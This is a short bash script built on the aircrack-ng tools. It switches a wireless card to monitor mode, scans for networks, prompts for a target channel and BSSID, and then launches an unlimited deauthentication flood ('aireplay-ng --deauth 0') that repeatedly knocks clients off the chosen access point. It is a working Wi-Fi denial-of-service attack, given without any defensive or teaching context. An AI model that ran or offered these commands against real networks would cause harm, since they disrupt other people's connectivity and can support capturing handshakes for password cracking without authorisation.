airmon-ng start wlp2s0
airodump-ng wlp2s0mon
echo -n "Enter the channel : "
read -e channel
echo -n "Enter bssid : "
read -e bssid

airodump-ng wlp2s0mon --channel ${channel} --bssid ${bssid}
aireplay-ng --deauth 0 -a ${bssid} wlp2s0mon

airmon-ng stop wlp2s0mon
systemctl start NetworkManager
